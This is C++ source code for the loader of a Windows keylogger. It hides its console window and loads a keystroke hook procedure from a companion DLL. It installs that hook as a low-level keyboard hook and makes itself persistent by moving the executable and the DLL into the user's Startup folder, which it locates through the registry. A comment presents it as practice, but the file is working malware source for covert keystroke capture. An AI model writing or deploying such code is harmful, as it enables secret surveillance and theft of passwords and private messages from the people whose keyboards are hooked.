#include <Windows.h>
#include <iostream>
#include <Shlobj.h>

#define _T TEXT
#define BUFSIZE 1024

void printError(char const* msg) {
    int errorCode = GetLastError();
    printf("ERROR (%d): %s\n", errorCode, msg);
}

static wchar_t const* dllName = L"KeyloggerProcImp.dll";
static HMODULE hLib = NULL;
static HOOKPROC keyloggerProc = NULL;

static wchar_t const* mutexName = L"Keylogger-Mutex";

int loadHookProc() {
    hLib = LoadLibraryW(dllName);
    if (hLib == NULL) {
        printError("cannot load KeyloggerProcImp.dll");
        return 1;
    }
    keyloggerProc = (HOOKPROC)GetProcAddress(hLib, "_lowKeyLoggerProc@12");
    //HOOKPROC keyloggerProc = (HOOKPROC)GetProcAddress(hLib, "_keyLoggerProc@12");
    if (keyloggerProc == NULL) {
        printError("cannot import keyloggerProc");
        return 1;
    }
    return 0;
}

// an approach using SetWindowsHookEx 
int usingWindowHooks(int argc, char const** argv) {
    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyloggerProc, hLib, 0);
    //HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD, keyloggerProc, hLib, 0);
    if (hHook == NULL) {
        printError("cannot hook keyboard events");
        return 1;
    }
    MSG msg = { };
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    return 0;
}

// startup folder (redundency for practicing registry key APIs)
void doPersistence() {
    // registry
    HKEY hShellFolderKey = NULL;
    DWORD size = BUFSIZE;
    BYTE startupPath[BUFSIZE] = {};
    BOOL retry = 0;
    wchar_t* pStartupPath = NULL;
    wchar_t expanded[BUFSIZE] = {};

    // module file name
    wchar_t modulePath[BUFSIZE] = {};

    int ret = 0;

    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders",
        0, KEY_READ, &hShellFolderKey)) {
        return;
    }
    if ((ret=RegQueryValueEx(hShellFolderKey, L"Startup", NULL, NULL, startupPath, &size)) > 0 && ret != ERROR_MORE_DATA) {
        return;
    }
    if (ret == ERROR_MORE_DATA) {   // retry
        pStartupPath = (wchar_t*)malloc(size + 1);
        if (pStartupPath == NULL) {
            return;
        }
        if ((ret = RegQueryValueEx(hShellFolderKey, L"Startup", NULL, NULL, (BYTE*)pStartupPath, &size)) > 0) {
            return;
        }
        retry = 1;
    }

    if (pStartupPath == NULL) {
        pStartupPath = (wchar_t*)startupPath;
    }
    // expand envs if having
    ExpandEnvironmentStrings(pStartupPath, expanded, BUFSIZE - 1);
    int preLen = wcslen(expanded);

    // move module file
    GetModuleFileName(NULL, modulePath, BUFSIZE);
    int slashAt = wcslen(modulePath) - 1;
    while (modulePath[slashAt] != L'\\') {
        slashAt -= 1;
    }
    wcscat_s(expanded, &modulePath[slashAt]);
    MoveFile(modulePath, expanded);

    // module dll
    expanded[preLen + 1] = L'\x00';
    modulePath[slashAt + 1] = L'\x00';
    wcscat_s(modulePath, dllName);
    wcscat_s(expanded, dllName);
    MoveFile(modulePath, expanded);

    if (retry) {
        free(pStartupPath);
    }
    RegCloseKey(hShellFolderKey);
}

void hideConsole() {
    HWND hWnd = GetConsoleWindow();
    if (hWnd != NULL) {
        ShowWindow(hWnd, SW_HIDE);
    }
}

int main(int argc, char const** argv) {
    HANDLE hMutex = NULL;

    hideConsole();
    if (loadHookProc()) {
        return 1;
    }
    // ensure only one instance
    hMutex = OpenMutex(SYNCHRONIZE, FALSE, mutexName);
    if (hMutex != NULL) {
        return 1;
    }
    hMutex = CreateMutex(
        NULL,              // default security attributes
        FALSE,             // initially not owned
        mutexName);

    doPersistence();
    usingWindowHooks(argc, argv);

    if (hMutex != NULL)
        ReleaseMutex(hMutex);
    return 0;
}
